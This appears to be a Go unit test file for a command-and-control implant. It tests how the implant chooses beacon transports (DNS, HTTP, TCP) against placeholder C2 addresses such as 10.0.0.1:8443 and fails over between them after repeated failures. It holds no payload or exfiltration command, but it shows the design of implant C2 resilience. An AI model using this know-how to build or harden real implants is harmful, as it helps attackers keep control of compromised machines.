//go:build linux || windows || darwin

package main

import (
	"testing"
)

func TestBuildTransportCandidatesIncludesDNSWhenConfigured(t *testing.T) {
	oldP, oldB, oldD, oldS := Protocol, BeaconTransport, DNSDomain, DNSServer
	defer func() { Protocol, BeaconTransport, DNSDomain, DNSServer = oldP, oldB, oldD, oldS }()

	Protocol, BeaconTransport = "dns", "dns"
	DNSDomain, DNSServer = "example.com", "1.1.1.1"
	cands := buildTransportCandidates()
	found := false
	for _, c := range cands {
		if c == "dns" {
			found = true
		}
	}
	if !found {
		t.Fatalf("expected dns in candidates when DNSDomain/DNSServer set, got %v", cands)
	}
}

func TestBuildTransportCandidatesExcludesDNSWhenUnconfigured(t *testing.T) {
	oldP, oldB, oldD, oldS := Protocol, BeaconTransport, DNSDomain, DNSServer
	defer func() { Protocol, BeaconTransport, DNSDomain, DNSServer = oldP, oldB, oldD, oldS }()

	Protocol, BeaconTransport = "http", "http"
	DNSDomain, DNSServer = "", ""
	cands := buildTransportCandidates()
	for _, c := range cands {
		if c == "dns" {
			t.Fatalf("dns should be excluded without DNSDomain/DNSServer, got %v", cands)
		}
	}
}

func TestBuildTransportCandidatesHTTPOnlyExcludesTCPAndICMP(t *testing.T) {
	oldP, oldB, oldD, oldS, oldURL := Protocol, BeaconTransport, DNSDomain, DNSServer, C2URL
	oldCands, oldIdx := transportCandidates, currentC2Idx.Load()
	defer func() {
		Protocol, BeaconTransport, DNSDomain, DNSServer, C2URL = oldP, oldB, oldD, oldS, oldURL
		transportCandidates = oldCands
		currentC2Idx.Store(oldIdx)
	}()

	Protocol, BeaconTransport = "http", "http"
	DNSDomain, DNSServer = "", ""
	C2URL = "http://10.0.0.1:8443"
	c2URLsStore([]string{C2URL}, 0)
	transportCandidates = nil

	cands := buildTransportCandidates()
	for _, c := range cands {
		if c == "tcp" || c == "icmp" || c == "udp" || c == "quic" {
			t.Fatalf("http-only implant must not failover to %s, got %v", c, cands)
		}
	}
	foundHTTP := false
	for _, c := range cands {
		if c == "http" {
			foundHTTP = true
		}
	}
	if !foundHTTP {
		t.Fatalf("expected http in candidates, got %v", cands)
	}
}

func TestBuildTransportCandidatesIncludesTCPWhenURLConfigured(t *testing.T) {
	oldP, oldB, oldD, oldS, oldURL := Protocol, BeaconTransport, DNSDomain, DNSServer, C2URL
	oldCands, oldIdx := transportCandidates, currentC2Idx.Load()
	defer func() {
		Protocol, BeaconTransport, DNSDomain, DNSServer, C2URL = oldP, oldB, oldD, oldS, oldURL
		transportCandidates = oldCands
		currentC2Idx.Store(oldIdx)
	}()

	Protocol, BeaconTransport = "http", "http"
	DNSDomain, DNSServer = "", ""
	C2URL = "http://10.0.0.1:8443,tcp://10.0.0.1:4444"
	c2URLsStore([]string{"http://10.0.0.1:8443", "tcp://10.0.0.1:4444"}, 0)
	transportCandidates = nil

	cands := buildTransportCandidates()
	foundTCP := false
	for _, c := range cands {
		if c == "tcp" {
			foundTCP = true
		}
	}
	if !foundTCP {
		t.Fatalf("expected tcp in candidates when tcp:// URL is configured, got %v", cands)
	}
}

func TestApplyTransportSelectsMatchingC2URL(t *testing.T) {
	oldP, oldB, oldURL := Protocol, BeaconTransport, C2URL
	oldIdx := currentC2Idx.Load()
	defer func() {
		Protocol, BeaconTransport, C2URL = oldP, oldB, oldURL
		currentC2Idx.Store(oldIdx)
	}()

	C2URL = "http://10.0.0.1:8443,tcp://10.0.0.1:4444"
	c2URLsStore([]string{"http://10.0.0.1:8443", "tcp://10.0.0.1:4444"}, 0)
	applyTransport("tcp")
	if effectiveTransport() != "tcp" {
		t.Fatalf("expected tcp transport, got %s", effectiveTransport())
	}
	if got := c2URLAtIndex(int(currentC2Idx.Load())); got != "tcp://10.0.0.1:4444" {
		t.Fatalf("expected tcp URL after applyTransport, got %q", got)
	}
}

func TestTransportFailoverRotatesAfterThreshold(t *testing.T) {
	oldP, oldB, oldD, oldS := Protocol, BeaconTransport, DNSDomain, DNSServer
	oldStreak, oldIdx, oldCands := transportFailStreak, currentTransportIdx, transportCandidates
	defer func() {
		Protocol, BeaconTransport, DNSDomain, DNSServer = oldP, oldB, oldD, oldS
		transportFailStreak, currentTransportIdx, transportCandidates = oldStreak, oldIdx, oldCands
	}()

	Protocol, BeaconTransport = "dns", "dns"
	DNSDomain, DNSServer = "example.com", "1.1.1.1"
	transportFailStreak = 0
	currentTransportIdx = 0
	transportCandidates = nil // force rebuild

	if effectiveTransport() != "dns" {
		t.Fatalf("precondition: effective transport should be dns")
	}
	// One short of threshold must not rotate.
	for i := 0; i < dnsFallbackThreshold-1; i++ {
		maybeRotateTransport()
	}
	if effectiveTransport() != "dns" {
		t.Fatalf("should not rotate before threshold, got %s", effectiveTransport())
	}
	// The threshold trigger must advance to the next candidate (http).
	maybeRotateTransport()
	if effectiveTransport() != "http" {
		t.Fatalf("expected failover to http, got %s", effectiveTransport())
	}
}
